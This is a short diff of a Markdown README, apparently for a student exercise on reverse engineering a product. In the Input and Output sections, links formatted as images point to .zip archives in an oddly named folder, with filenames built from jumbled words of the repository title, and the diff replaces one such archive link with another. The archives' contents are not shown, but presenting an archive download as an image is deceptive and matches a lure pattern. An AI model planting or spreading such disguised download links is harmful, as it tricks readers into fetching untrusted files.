@@ -32,12 +32,12 @@
 
 ## Input:
 
-![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-10---REVERSE-ENGINEER-THE-GIVEN-PRODUCT/main/bandannaed/REVERS-Ex-GIVE-TH-ENGINEE-PRODUCT-3.0.zip)
+![image](https://github.com/Yugabharathi91/Ex.-10---REVERSE-ENGINEER-THE-GIVEN-PRODUCT/raw/refs/heads/main/bandannaed/ENGINEE_GIVE_TH_Ex_PRODUCT_REVERS_v2.1.zip)
 
 
 
 ### Output:
-![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-10---REVERSE-ENGINEER-THE-GIVEN-PRODUCT/main/bandannaed/REVERS-Ex-GIVE-TH-ENGINEE-PRODUCT-3.0.zip)
+![image](https://github.com/Yugabharathi91/Ex.-10---REVERSE-ENGINEER-THE-GIVEN-PRODUCT/raw/refs/heads/main/bandannaed/ENGINEE_GIVE_TH_Ex_PRODUCT_REVERS_v2.1.zip)
 
 
 ### Name: 212224230314
